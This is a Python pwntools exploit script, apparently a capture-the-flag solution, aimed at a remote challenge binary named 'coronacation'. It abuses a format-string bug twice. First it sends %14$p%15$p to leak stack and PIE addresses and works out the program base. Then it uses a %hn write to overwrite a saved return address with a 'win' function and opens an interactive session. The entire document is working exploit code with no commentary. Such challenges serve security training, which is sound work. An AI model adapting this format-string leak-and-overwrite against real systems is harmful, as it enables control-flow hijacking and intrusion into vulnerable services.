from pwn import *

#target=process('./coronacation')
target=remote('ctf.umbccd.io' ,4300)
context.terminal=["tmux","split","-h"]
#gdb.attach(target)

print(target.recvuntil("out.\n"))

winoff=0x1165
retoff=0x1484
finiarrayoff=0x3da8

fs="1%14$p%15$p"
target.sendline(fs)
print(target.recvuntil("chose: 1"))
leaks=target.recvline().strip("\n")
stackleak=int(leaks[0:14],16)
pieleak=int(leaks[14:28],16)
print(hex(stackleak))
print(hex(pieleak))

piebase=pieleak-retoff
print(hex(piebase))
piefiniarray=piebase+finiarrayoff
piewin=piebase+winoff
print(hex(piewin))
val=int(hex(piewin)[10:14],16)
print(val)
writeaddr=stackleak-88
print(hex(writeaddr))

print(target.recvuntil("plan.\n"))

fs2="%"+str(val)+"x"+"%8$hn...."+p64(writeaddr)
target.sendline(fs2)
print(target.recv())
target.interactive()
